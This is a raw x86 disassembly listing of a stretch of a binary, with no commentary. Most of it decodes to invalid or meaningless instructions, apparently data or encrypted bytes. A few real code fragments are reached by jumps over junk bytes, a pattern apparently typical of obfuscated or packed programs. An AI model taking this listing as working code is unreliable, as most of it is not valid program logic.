  412975:	dec    edi
  412976:	sub    edx,esp
  412978:	outs   dx,BYTE PTR ds:[esi]
  412979:	nop
  41297a:	or     ah,bh
  41297c:	or     al,0x59
  41297e:	xchg   DWORD PTR [esi-0x9bca2d7],edi
  412984:	sub    DWORD PTR [ecx],0xffffff9d
  412987:	sbb    ecx,DWORD PTR [edi-0x3]
  41298a:	pop    esp
  41298b:	test   BYTE PTR [ecx],bl
  41298d:	inc    esp
  41298e:	fisttp DWORD PTR [edx-0x17ef91d7]
  412994:	jge    0x41296d
  412996:	fnstenv [esi+edx*4-0x79]
  41299a:	jg     0x4129e0
  41299c:	stos   BYTE PTR es:[edi],al
  41299d:	dec    esi
  41299e:	lds    ecx,FWORD PTR gs:[ebp+0x7dd3a425]
  4129a5:	rcl    DWORD PTR [ecx+eiz*8],cl
  4129a8:	push   edi
  4129a9:	or     eax,DWORD PTR [esi-0x5b]
  4129ac:	and    BYTE PTR [eax+ebp*8+0x6c],ch
  4129b0:	dec    esp
  4129b1:	xor    al,0x24
  4129b3:	sahf   
  4129b4:	stc    
  4129b5:	add    bh,BYTE PTR [ebx-0x5433a2ad]
  4129bb:	mov    ebp,0x6261c1b3
  4129c0:	sti    
  4129c1:	sub    DWORD PTR [ebp-0x52c123eb],0xa21056ce
  4129cb:	inc    ebp
  4129cc:	(bad)  
  4129ce:	dec    ecx
  4129cf:	push   ds
  4129d0:	mov    eax,ds:0x658150f
  4129d5:	lock lahf 
  4129d7:	loop   0x4129ac
  4129d9:	and    BYTE PTR [ecx],bl
  4129db:	mov    ds:0x1bde870,al
  4129e0:	cwde   
  4129e1:	repz or edx,DWORD PTR [esi]
  4129e4:	push   esi
  4129e5:	and    eax,DWORD PTR [edi-0x47]
  4129e8:	pop    esp
  4129e9:	std    
  4129ea:	or     eax,0xa42abe34
  4129ef:	mov    ebp,0x81f9332f
  4129f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f5:	add    BYTE PTR [ecx-0x2f9d197b],dh
  4129fb:	or     BYTE PTR [edx+0x64f87db3],dl
  412a01:	dec    esi
  412a02:	sub    BYTE PTR [ebp+0x55],ah
  412a05:	mov    ebp,DWORD PTR [edx-0x5099bfe7]
  412a0b:	rcl    BYTE PTR [edx+edi*2+0x29],0x2f
  412a10:	push   ebx
  412a11:	(bad)  
  412a12:	popf   
  412a13:	pop    edi
  412a14:	retf   0x2265
  412a17:	adc    DWORD PTR [esp+ecx*8-0x1e],eax
  412a1b:	and    al,0x62
  412a1d:	sub    edx,esp
  412a1f:	push   eax
  412a20:	inc    edx
  412a21:	sbb    esi,DWORD PTR [esi+0x7f]
  412a24:	shr    BYTE PTR [edi-0x5],cl
  412a27:	cmp    BYTE PTR [ebp+0x45],0x9d
  412a2b:	jg     0x4129da
  412a2d:	mov    bh,0x8c
  412a2f:	jecxz  0x412a62
  412a31:	push   esp
  412a32:	inc    esi
  412a33:	jb     0x412a18
  412a35:	jmp    0x412a41
  412a37:	xor    DWORD PTR ds:0x92de9853,ebp
  412a3d:	clc    
  412a3e:	dec    edi
  412a3f:	mov    DWORD PTR [ebx-0x26],0xb44bf8b7
  412a46:	fiadd  WORD PTR [edx]
  412a48:	inc    eax
  412a49:	mov    WORD PTR [esi+ebp*4+0x1c9882e4],?
  412a50:	xchg   BYTE PTR [ebx-0x37],ah
  412a53:	dec    esi
  412a54:	sbb    ecx,DWORD PTR [ebx+eax*8+0x36]
  412a58:	dec    ebx
  412a59:	in     eax,0x20
  412a5b:	mov    eax,0x9a7afbbc
  412a60:	cmp    al,0xc2
  412a62:	mov    edi,0x6a796fe0
  412a67:	scas   eax,DWORD PTR es:[edi]
  412a68:	retf   
  412a69:	push   ebp
  412a6a:	dec    ecx
  412a6b:	lahf   
  412a6c:	inc    ebp
  412a6d:	push   0x74
  412a6f:	mov    eax,0x15a0f865
  412a74:	push   ebp
  412a75:	mov    edi,0x6da790a3
  412a7a:	dec    esp
  412a7b:	popa   
  412a7c:	rol    BYTE PTR [ecx],cl
  412a7e:	test   esi,0x55259076
  412a84:	jp     0x412a87
  412a86:	or     al,0x6e
  412a88:	rcl    BYTE PTR [edx],cl
  412a8a:	cmp    cl,al
  412a8c:	das    
  412a8d:	pusha  
  412a8e:	test   DWORD PTR [ecx],edx
  412a90:	rcl    BYTE PTR [edi-0x50],1
  412a93:	loopne 0x412a63
  412a95:	jg     0x412b06
  412a97:	pause  
  412a99:	mov    ecx,edi
  412a9b:	push   esp
  412a9c:	mov    dh,0xa3
  412a9e:	or     al,0x70
  412aa0:	push   edx
  412aa1:	icebp  
  412aa2:	sbb    al,0xbb
  412aa4:	jae    0x412b22
  412aa6:	xor    DWORD PTR [eax+0x2d],ebp
  412aa9:	xchg   esp,eax
  412aaa:	dec    edx
  412aab:	push   eax
  412aac:	retfw  
  412aae:	adc    eax,0xc4608d5e
  412ab3:	div    BYTE PTR [esi-0x1a]
  412ab6:	pop    ebx
  412ab7:	sbb    ebp,ecx
  412ab9:	xor    cl,BYTE PTR [edi]
  412abb:	adc    dl,BYTE PTR [eax-0x3d]
  412abe:	and    eax,0xa5e824d
  412ac3:	test   al,0x5
  412ac5:	sub    eax,0x1b0094c2
  412aca:	pop    ss
  412acb:	adc    esi,ecx
  412acd:	or     DWORD PTR [ebx-0x7900af08],edx
  412ad3:	mov    ch,0xcf
  412ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ad6:	mov    esi,0x91c1e72e
  412adb:	mov    bh,0x56
  412add:	rol    ebx,cl
  412adf:	inc    edi
  412ae0:	push   esp
  412ae1:	sub    ebp,edi
  412ae3:	push   esi
  412ae4:	add    edx,0xe4ec48da
  412aea:	xchg   ebp,eax
  412aeb:	mov    BYTE PTR ds:0xbf06042d,ah
  412af1:	addr16 jnp 0x412abb
  412af4:	inc    edi
  412af5:	in     al,0xd6
  412af7:	sbb    BYTE PTR [eax+0x5a],bl
  412afa:	div    DWORD PTR [eax-0x7551dbdc]
  412b00:	ss pusha 
  412b02:	push   eax
  412b03:	bound  eax,QWORD PTR [ecx]
  412b05:	xchg   BYTE PTR [edi+edi*1+0x63fb83be],ch
  412b0c:	mov    ds:0xd21b7af6,al
  412b11:	xchg   esp,eax
  412b12:	ret    
  412b13:	push   ecx
  412b14:	repz adc dl,al
  412b17:	mov    ebx,0x7836aba1
  412b1c:	aad    0xbf
  412b1e:	out    0x24,al
  412b20:	neg    DWORD PTR [edx]
  412b22:	sbb    BYTE PTR [ecx],0x3c
  412b25:	imul   ebp,DWORD PTR [edi],0x8c5d56b1
  412b2b:	push   edx
  412b2c:	cmc    
  412b2d:	sbb    eax,0xb67bb869
  412b32:	mov    al,ds:0xdacbda29
  412b37:	je     0x412b16
  412b39:	and    DWORD PTR [ebp+eiz*8+0x30],0x71
  412b3e:	ret    
  412b3f:	pop    eax
  412b40:	popa   
  412b41:	dec    edi
  412b42:	repnz mov dh,0x92
  412b45:	jo     0x412b88
  412b47:	aam    0xac
  412b49:	lods   eax,DWORD PTR ds:[esi]
  412b4a:	xor    ebp,DWORD PTR [edi]
  412b4c:	(bad)
  412b4f:	ss out dx,eax
  412b51:	and    ah,BYTE PTR [ecx]
  412b53:	loop   0x412b42
  412b55:	imul   esi,DWORD PTR [esi+0x9b0655c],0x46fe0cf
  412b5f:	push   ss
  412b60:	ins    DWORD PTR es:[edi],dx
  412b61:	data16 jns 0x412b45
  412b64:	push   ecx
  412b65:	xchg   ebx,eax
  412b66:	ja     0x412bba
  412b68:	(bad)  
  412b69:	js     0x412b6b
  412b6b:	dec    ebp
  412b6c:	es addr16 cdq 
  412b6f:	adc    al,ch
  412b71:	mov    edi,0x1a107f3f
  412b76:	arpl   bx,bp
  412b78:	sub    BYTE PTR [edx+0x29],ah
  412b7b:	mov    edx,0x5a71327a
  412b80:	(bad)
  412b83:	jnp    0x412b31
  412b85:	pusha  
  412b86:	inc    ebp
  412b87:	adc    DWORD PTR [esi],0xcb3a34d0
  412b8d:	jmp    0x412b1d
  412b8f:	adc    al,ah
  412b91:	call   0x53bc:0x12545b4c
  412b98:	inc    ecx
  412b99:	outs   dx,DWORD PTR ds:[esi]
  412b9a:	loop   0x412b32
  412b9c:	je     0x412b3a
  412b9e:	sbb    ecx,DWORD PTR [ebx-0x64844b4e]
  412ba4:	(bad)  
  412ba5:	sub    ecx,0xffffff92
  412ba8:	mov    dl,0x22
  412baa:	jae    0x412c13
  412bac:	mov    dh,0x9a
  412bae:	cs sub al,0x7d
  412bb1:	enter  0xc108,0xb5
  412bb5:	adc    esp,DWORD PTR [ecx+0x78d8ee1a]
  412bbb:	(bad)  
  412bbc:	sub    edx,DWORD PTR [esp+edx*2]
  412bbf:	or     al,0xf5
  412bc1:	jg     0x412b7f
  412bc3:	jg     0x412b97
  412bc5:	pop    eax
  412bc6:	jl     0x412c13
  412bc8:	or     BYTE PTR [ebx-0x21bbcecf],ch
  412bce:	ret    0x437
  412bd1:	test   DWORD PTR [ecx+0x2deef80a],esp
  412bd7:	mov    eax,ds:0x40a4d818
  412bdc:	dec    ebx
  412bdd:	ret    0x3416
  412be0:	sub    cl,BYTE PTR [edi]
  412be2:	push   cs
  412be3:	icebp  
  412be4:	mov    ch,0xd2
  412be6:	scas   eax,DWORD PTR es:[edi]
  412be7:	fcom   DWORD PTR [ebx+ebp*4-0x663ace52]
  412bee:	cwde   
  412bef:	ret    0xc167
  412bf2:	(bad)  
  412bf3:	jmp    0x59012d68
  412bf8:	mov    bl,0xfd
  412bfa:	mov    ch,BYTE PTR [esi+edx*8+0xa57ec2d]
  412c01:	fs and cl,dh
  412c04:	push   edx
  412c05:	test   DWORD PTR fs:[esi],edx
  412c08:	in     eax,dx
  412c09:	test   eax,0xb1aa2808
  412c0e:	push   eax
  412c0f:	cwde   
  412c10:	test   BYTE PTR [ebx+0x31db32a0],0x42
  412c17:	fld    QWORD PTR [eax-0x7debac55]
  412c1d:	push   esp
  412c1e:	xchg   ebp,eax
  412c1f:	or     ah,0xc3
  412c22:	cmp    al,0x6b
  412c24:	jbe    0x412c71
  412c26:	xchg   edi,eax
  412c27:	mov    dh,0x6b
  412c29:	mov    edx,0xa4ef9073
  412c2e:	pop    ss
  412c2f:	je     0x412c35
  412c31:	pop    ds
  412c32:	aad    0x21
  412c34:	mov    ecx,0x3e18bfee
  412c39:	sbb    eax,0x6994b9a
  412c3e:	dec    ebp
  412c3f:	cli    
  412c40:	fcmovnb st,st(1)
  412c42:	and    ah,BYTE PTR [eax-0x75]
  412c45:	sbb    BYTE PTR [ebp-0x7cd85ac9],bl
  412c4b:	test   eax,0x5542a03a
  412c50:	mov    ds:0x36c89a03,al
  412c55:	mov    ebp,0x44ae470f
  412c5a:	sbb    eax,0xeac27cf8
  412c5f:	and    BYTE PTR [ebp+0x24],ch
  412c62:	sub    eax,0x6902d2b0
  412c67:	jle    0x412c57
  412c69:	test   BYTE PTR [ecx],ah
  412c6b:	popa   
  412c6c:	lea    ecx,[ebx+0x4d8bf845]
  412c72:	cld    
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xb07dca8d
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [eax+0x462fa112],dh
  412cb2:	(bad)
  412cb5:	xchg   ecx,eax
  412cb6:	enter  0x50dd,0xfc
  412cba:	mov    ds:0x4e8b7654,al
  412cbf:	ficom  DWORD PTR [ebp-0x2e00c298]
  412cc5:	add    al,0x4b
  412cc7:	mov    eax,ds:0xb9f556c
  412ccc:	xlat   BYTE PTR ds:[ebx]
  412ccd:	test   eax,0x4f229de5
  412cd2:	mov    dh,0xf5
  412cd4:	push   ebx
  412cd5:	lock cmp edi,edi
  412cd8:	stos   DWORD PTR es:[edi],eax
  412cd9:	in     al,0x6
  412cdb:	in     eax,0xf
  412cdd:	pop    ecx
  412cde:	jp     0x412d3c
  412ce0:	and    dl,BYTE PTR [ecx+edi*4+0x2fd74d14]
  412ce7:	or     ch,BYTE PTR [edx+ebx*8-0x1cc6d532]
  412cee:	cmc    
  412cef:	mov    ah,0x5f
  412cf1:	psubsb mm3,mm5
  412cf4:	or     DWORD PTR [ecx-0x5a],0xffffff91
  412cf8:	arpl   WORD PTR [ecx+ecx*2-0x8],bx
  412cfc:	jo     0x412d2e
  412cfe:	and    edi,DWORD PTR [ebx+0x40831805]
  412d04:	mov    eax,0x28e38ba2
  412d09:	and    BYTE PTR [eax+0x28362045],al
  412d0f:	jno    0x412c94
  412d11:	(bad)  
  412d12:	cmc    
  412d13:	mov    al,0xcc
  412d15:	ss daa 
  412d17:	xchg   al,al
  412d19:	loope  0x412d7d
  412d1b:	jmp    FWORD PTR [esp+ebp*8]
  412d1e:	inc    edx
  412d1f:	clc    
  412d20:	sub    eax,0x9edeebf1
  412d25:	lods   eax,DWORD PTR ds:[esi]
  412d26:	mov    bh,0x86
  412d28:	mov    dh,0xe8
  412d2a:	or     ebp,DWORD PTR [edi+ecx*2-0x53]
  412d2e:	(bad)  
  412d30:	sbb    bh,BYTE PTR [esi+0x306cf133]
  412d36:	dec    edi
  412d37:	pop    ebx
  412d38:	lock retf 
  412d3a:	pop    ebp
  412d3b:	shr    dl,cl
  412d3d:	test   DWORD PTR [esi-0x41],ebp
  412d40:	in     al,0x68
  412d42:	sbb    al,bh
  412d44:	mov    cl,0xf3
  412d46:	adc    eax,0x555666f3
  412d4b:	js     0x412dbc
  412d4d:	push   edi
  412d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d4f:	sub    esp,esi
  412d51:	popf   
  412d52:	jae    0x412d69
  412d54:	xchg   DWORD PTR [edx+0x1a],ebp
  412d57:	sbb    bh,0x16
  412d5a:	or     eax,0xbe0245fe
  412d5f:	les    eax,FWORD PTR [edx-0x1e]
  412d62:	int3   
  412d63:	inc    edx
  412d64:	stos   DWORD PTR es:[edi],eax
  412d65:	xchg   esp,eax
  412d66:	jg     0x412ce8
  412d68:	test   edi,0x62216620
  412d6e:	retf   
  412d6f:	jecxz  0x412d42
  412d71:	pop    esp
  412d72:	push   es
  412d73:	push   edx
  412d74:	sar    eax,0xf5
  412d77:	xor    BYTE PTR [eax-0x5a14c523],dh
  412d7d:	aas    
  412d7e:	lea    edx,[esi]
  412d80:	mov    ebp,0x86b409cb
  412d85:	adc    edi,ecx
  412d87:	and    DWORD PTR [eax-0x41],edi
  412d8a:	sahf   
  412d8b:	dec    ebp
  412d8c:	in     al,dx
  412d8d:	mov    al,ds:0xb2176267
  412d92:	mov    edi,0xcd7331ed
  412d97:	call   0xb64a646a
  412d9c:	jmp    0xdb4c4a38
  412da1:	pop    ebp
  412da2:	daa    
  412da3:	xor    DWORD PTR [edi-0x1618b0df],esp
  412da9:	std    
  412daa:	imul   esi,ebx,0x74
  412dad:	test   BYTE PTR [eax],bh
  412daf:	or     al,ch
  412db1:	ret    0x2d0d
  412db4:	cmp    BYTE PTR [ebp+0x12f6e8ab],bl
  412dba:	out    0x95,al
  412dbc:	jae    0x412e2a
  412dbe:	sbb    al,bl
  412dc0:	mov    esp,0xfcbe0a29
  412dc5:	jg     0x412df2
  412dc7:	stos   BYTE PTR es:[edi],al
  412dc8:	shr    DWORD PTR [edx+0x3c],cl
  412dcb:	inc    esp
  412dcc:	or     DWORD PTR [ebp-0x2a],0x3c
  412dd0:	add    eax,0x5e063ba0
  412dd5:	jnp    0x412dd0
  412dd7:	xor    BYTE PTR [esi-0x70a4a8d],bh
  412ddd:	xor    al,0x10
  412ddf:	lahf   
  412de0:	clc    
  412de1:	xor    al,0xbb
  412de3:	(bad)  
  412de4:	and    esi,esp
  412de6:	push   edi
  412de7:	mov    ds:0x5d75ca3,eax
  412ded:	xor    esi,DWORD PTR [ebp-0x2e722024]
  412df3:	push   ds
  412df4:	add    al,BYTE PTR [edx]
  412df6:	cld    
  412df7:	fnstsw WORD PTR [esi+0x7c8131d0]
  412dfd:	cs mov bh,0x39
  412e00:	xchg   edx,eax
  412e01:	outs   dx,BYTE PTR ds:[esi]
  412e02:	sbb    al,0x6
  412e04:	arpl   WORD PTR [edi],bp
  412e06:	adc    BYTE PTR [edi],dl
  412e08:	sti    
  412e09:	in     al,0x2
  412e0b:	(bad)  
  412e0c:	in     eax,0x5f
  412e0e:	imul   esp,DWORD PTR [ebp+0x36],0x8cb0fcb3
  412e15:	popa   
  412e16:	fldz   
  412e18:	cmp    ecx,DWORD PTR [eax+0x43]
  412e1b:	push   0x8b0f80bb
  412e20:	data16 ins BYTE PTR es:[edi],dx
  412e22:	fnstcw WORD PTR [ebp+0x58bb35ac]
  412e28:	loopne 0x412e29
  412e2a:	xchg   ebp,eax
  412e2b:	adc    dl,bl
  412e2d:	stc    
  412e2e:	sbb    al,0x3d
  412e30:	sbb    ebp,DWORD PTR [ebp+0x78]
  412e33:	xor    BYTE PTR [ebx-0x37],cl
  412e36:	pusha  
  412e37:	mov    esi,0xf2ca2b8b
  412e3c:	dec    esp
  412e3d:	icebp  
  412e3e:	dec    esp
  412e3f:	mov    al,ds:0xb9dadfdf
  412e44:	popf   
  412e45:	leave  
  412e46:	ss leave 
  412e48:	adc    edi,ecx
  412e4a:	mov    esp,0x542edf6f
  412e4f:	inc    esi
  412e50:	ins    BYTE PTR es:[edi],dx
  412e51:	push   esi
  412e52:	push   ebx
  412e53:	icebp  
  412e54:	add    DWORD PTR [esi-0x39],edx
  412e57:	mov    ecx,0xd88ea6c4
  412e5c:	out    0xb8,eax
  412e5e:	or     esp,edx
  412e60:	in     al,dx
  412e61:	or     dl,cl
  412e63:	lods   al,BYTE PTR ds:[esi]
  412e64:	xlat   BYTE PTR ds:[ebx]
  412e65:	into   
  412e66:	jl     0x412ebf
  412e68:	(bad)  
  412e69:	das    
  412e6a:	xchg   ebx,eax
  412e6b:	(bad)  
  412e6c:	mov    edx,0xc190a7f3
  412e71:	add    dl,BYTE PTR [eax-0x7a29b1c0]
  412e77:	mov    ds:0xdc2dafd4,al
  412e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e7d:	pop    ds
  412e7e:	jno    0x412e46
  412e80:	mov    bl,0x85
  412e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e83:	cmp    al,0x6f
  412e85:	mov    eax,0xf0e543d1
  412e8a:	cmp    DWORD PTR [ebp-0x6a37cb2c],esi
  412e90:	pop    esi
  412e91:	daa    
  412e92:	mov    dh,bh
  412e94:	stos   BYTE PTR es:[edi],al
  412e95:	dec    edx
  412e96:	mov    bl,0x25
  412e98:	pop    ecx
  412e99:	dec    edx
  412e9a:	(bad)  
  412e9b:	icebp  
  412e9c:	addr16 (bad) 
  412e9e:	cmp    cl,BYTE PTR [eax-0x214ceebc]
  412ea4:	jmp    DWORD PTR [ecx]
  412ea6:	call   0xb9fc:0x797d8019
  412ead:	fdiv   DWORD PTR [ecx]
  412eaf:	and    ebp,DWORD PTR [esi+ecx*2-0x56b4ad09]
  412eb6:	jns    0x412e8a
  412eb8:	push   esp
  412eb9:	jno    0x412f16
  412ebb:	pop    ebp
  412ebc:	dec    edi
  412ebd:	jb     0x412f2c
  412ebf:	call   0x2e69:0x7feafba7
  412ec6:	addr16 push edi
  412ec8:	jmp    FWORD PTR ss:[edx-0x73]
  412ecc:	ret    
  412ecd:	jb     0x412e70
  412ecf:	hlt    
  412ed0:	inc    eax
  412ed1:	and    bh,BYTE PTR [edi]
  412ed3:	dec    edx
  412ed4:	sub    al,0x1e
  412ed6:	jbe    0x412eea
  412ed8:	(bad)  
  412ed9:	aam    0x49
  412edb:	mov    al,0x1a
  412edd:	dec    eax
  412ede:	daa    
  412edf:	or     bh,BYTE PTR [eax+0x21918f5f]
  412ee5:	add    eax,0x114e052b
  412eea:	xchg   ecx,eax
  412eeb:	dec    ebx
  412eec:	dec    ecx
  412eed:	dec    esi
  412eee:	cdq    
  412eef:	cmp    al,0xc
  412ef1:	fimul  DWORD PTR ds:0x87af36ec
  412ef7:	sbb    BYTE PTR [ebx],ah
  412ef9:	mov    edx,0x43c960ca
  412efe:	jp     0x412efe
  412f00:	xchg   edx,eax
  412f01:	fmul   DWORD PTR [eax-0x37]
  412f04:	and    BYTE PTR [eax],ch
  412f06:	fnsetpm(287 only) 
  412f08:	dec    ebp
  412f09:	ja     0x412f2e
  412f0b:	in     al,dx
  412f0c:	lock and eax,0xf5024cb7
  412f12:	ins    DWORD PTR es:[edi],dx
  412f13:	cmp    DWORD PTR [edi-0x26c35bd6],ebp
  412f19:	int3   
  412f1a:	out    dx,al
  412f1b:	adc    bl,BYTE PTR [ebx+0x43f71fe0]
  412f21:	push   0x3d3e81f
  412f26:	shl    BYTE PTR [ebx-0x35],cl
  412f29:	hlt    
  412f2a:	les    edx,FWORD PTR [edi]
  412f2c:	sub    ch,ah
  412f2e:	arpl   WORD PTR [ecx-0x31],di
  412f31:	pop    edx
  412f32:	dec    ebp
  412f33:	jmp    0x412f13
  412f35:	mov    bl,0x62
  412f37:	and    BYTE PTR [ecx+0x59bf2a1d],0xe1
  412f3e:	aas    
  412f3f:	xchg   ebp,eax
  412f40:	or     eax,0x605ecfb0
  412f45:	ret    0x9b18
  412f48:	shl    dh,0xd8
  412f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f4c:	jno    0x412fae
  412f4e:	stos   DWORD PTR es:[edi],eax
  412f4f:	xor    al,0xba
  412f51:	adc    eax,0x67fe5e1d
  412f56:	in     eax,dx
  412f57:	lods   eax,DWORD PTR ds:[esi]
  412f58:	inc    ecx
  412f59:	or     al,0x87
  412f5b:	fs mulps xmm4,xmm6
  412f5f:	fld    QWORD PTR [ebp+0x70]
  412f62:	iret   
  412f63:	pop    esp
  412f64:	leave  
  412f65:	mov    ebx,0x7d770741
  412f6a:	mov    DWORD PTR [ecx-0x24f3cc78],eax
  412f70:	scas   eax,DWORD PTR es:[edi]
  412f71:	aad    0x77
  412f73:	rcl    BYTE PTR [eax],0xf0
  412f76:	mov    ds:0x6e189635,al
  412f7b:	sahf   
  412f7c:	hlt    
  412f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f7e:	clc    
  412f7f:	pop    ebx
  412f80:	ja     0x412f25
  412f82:	mov    al,ds:0xe613e77
  412f87:	or     DWORD PTR [ebp+ecx*2-0x751ee389],esi
  412f8e:	sar    DWORD PTR [edi-0x8],0x11
  412f92:	test   al,0x92
  412f94:	mov    al,ds:0xa07c84f8
  412f99:	rcl    BYTE PTR [esi+eax*1],0xb9
  412f9d:	and    ecx,DWORD PTR [esi]
  412f9f:	mov    eax,ds:0xaf42c6ee
  412fa4:	push   ds
  412fa5:	out    dx,eax
  412fa6:	mov    bh,0xe2
  412fa8:	cmp    bl,BYTE PTR [ecx-0x468723f4]
  412fae:	mov    ebp,0x207d0ea4
  412fb3:	sbb    eax,ebp
  412fb5:	mov    al,ds:0x1054a668
  412fba:	push   ss
  412fbb:	dec    edx
  412fbc:	add    al,0xcd
  412fbe:	and    eax,0xdd249d12
  412fc3:	cmp    bl,BYTE PTR [eax]
  412fc5:	adc    eax,0x5f2d03c2
  412fca:	sbb    ch,ch
  412fcc:	xchg   ecx,eax
  412fcd:	test   al,0x63
  412fcf:	bound  eax,QWORD PTR [esp+ecx*1]
  412fd2:	sbb    eax,0x26599bc6
  412fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd8:	jl     0x412fec
  412fda:	fsub   DWORD PTR [ebx]
  412fdc:	sbb    eax,0x269f528a
  412fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe2:	sub    eax,0x736fc110
  412fe7:	mov    ebx,0x3e058021
  412fec:	cmp    DWORD PTR [eax],ebp
  412fee:	add    ch,BYTE PTR [edx+0x7]
  412ff1:	(bad)
  412ff5:	pop    eax
  412ff6:	inc    ecx
  412ff7:	add    ecx,ebx
  412ff9:	or     BYTE PTR [edi+0x4874b5c8],bh
  412fff:	pop    eax
  413000:	sbb    eax,0x8a104ad7
  413005:	jmp    0x8a2:0xd798d3f
  41300c:	cs xor al,0x3d
  41300f:	jge    0x412f9d
  413011:	pop    ss
  413012:	or     BYTE PTR [esi+0x70e97c8f],0x5e
  413019:	jmp    0xda52:0x4a6569fb
  413020:	cld    
  413021:	test   BYTE PTR [ebp-0x6b3f63a3],al
  413027:	scas   eax,DWORD PTR es:[edi]
  413028:	push   ds
  413029:	jae    0x412fb1
  41302b:	in     al,dx
  41302c:	pop    ebp
  41302d:	mov    ds:0xb7751a2,eax
  413032:	inc    ebx
  413033:	push   ds
  413034:	dec    ebp
  413035:	dec    ebp
  413036:	xchg   edi,eax
  413037:	pop    ecx
  413038:	sbb    eax,0x1ebb5e4
  41303d:	and    al,0xb6
  41303f:	sbb    ecx,DWORD PTR [edx+0x4975b0fb]
  413045:	hlt    
  413046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413047:	xor    eax,0x15aaf692
  41304c:	mov    bx,0x8eb3
  413050:	fiadd  WORD PTR [ecx-0x6e]
  413053:	pop    eax
  413054:	jne    0x41305a
  413056:	cmp    ah,ch
  413058:	in     eax,dx
  413059:	mov    ebp,DWORD PTR [edx]
  41305b:	in     eax,dx
  41305c:	aam    0x34
  41305e:	lods   al,BYTE PTR ds:[esi]
  41305f:	outs   dx,DWORD PTR ds:[esi]
  413060:	shr    DWORD PTR [esi-0x2a811210],cl
  413066:	mov    dh,0xa
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x42206a
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [edi+edx*8-0x6a],edi
  4130e0:	test   eax,0x1848d3bc
  4130e5:	sbb    BYTE PTR [edx-0x36e7e7ee],ch
  4130eb:	in     al,0x4e
  4130ed:	loope  0x413124
  4130ef:	cmp    DWORD PTR [ebx],ebp
  4130f1:	cmp    edi,DWORD PTR [ebp*1-0xc4282e6]
  4130f8:	add    DWORD PTR [edx-0x54c0b9f9],esi
  4130fe:	add    DWORD PTR [edi-0x708e3c5d],eax
  413104:	or     al,dl
  413106:	loope  0x413101
  413108:	gs data16 out 0xc0,al
  41310c:	aad    0x6e
  41310e:	loope  0x413178
  413110:	icebp  
  413111:	mov    al,BYTE PTR [edx]
  413113:	mov    esi,0x1465445e
  413118:	pop    ds
  413119:	mov    eax,ds:0x909a817b
  41311e:	out    dx,eax
  41311f:	and    ecx,DWORD PTR [esp+edi*8]
  413122:	std    
  413123:	pushf  
  413124:	inc    esp
  413125:	popa   
  413126:	icebp  
  413127:	mov    al,ds:0x520e925a
  41312c:	mov    ch,0x3e
  41312e:	dec    edx
  41312f:	xchg   BYTE PTR [edi],dl
  413131:	pop    esi
  413132:	push   0xe0b4e51d
  413137:	mov    ebp,DWORD PTR [edi*4-0x35db68e]
  41313e:	add    ch,ah
  413140:	retf   0x5f95
  413143:	add    al,BYTE PTR [ebp+0x52b382f0]
  413149:	cmp    eax,0xea051188
  41314e:	fstp   TBYTE PTR ds:0x84d9cd0d
  413154:	jae    0x41311a
  413156:	jb     0x4131ae
  413158:	bound  edi,QWORD PTR [ebx+0x3d]
  41315b:	push   0x70
  41315d:	das    
  41315e:	shl    DWORD PTR [edx],1
  413160:	inc    esp
  413161:	cld    
  413162:	shl    bl,0x10
  413165:	inc    eax
  413166:	rcr    BYTE PTR [esi-0x57],1
  413169:	ds imul eax,esi,0xc6c2a93f
  413170:	imul   esi,DWORD PTR [edi-0x59e99f1e],0x83ec7232
  41317a:	in     eax,0xb2
  41317c:	pusha  
  41317d:	out    dx,eax
  41317e:	push   eax
  41317f:	pop    es
  413180:	gs pop ds
  413182:	call   0x9704:0x13da6e03
